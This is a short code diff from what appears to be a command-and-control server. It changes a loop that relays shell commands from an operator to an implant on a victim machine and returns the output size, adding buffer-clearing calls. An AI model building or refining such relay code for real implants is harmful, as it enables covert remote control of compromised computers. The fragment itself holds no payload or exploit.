@@ -147,11 +147,12 @@ public:
             logger::success("Bridging established between Implant and Operator.");
 
             while (vic->is_alive() && op->is_alive()) {
+                session_handshake::clear_recv_buffer(*op);
                 const auto cmd = trim_string(op->recvline());
                 logger::debug("Shell Command From Operator: [{}]", cmd);
                 vic->sendline(cmd);
 
-                // forward output size
+                session_handshake::clear_recv_buffer(*vic);
                 const auto output_size = trim_string(vic->recvline());
                 logger::debug("Output Size: [{}]", output_size);
                 op->sendline(output_size);
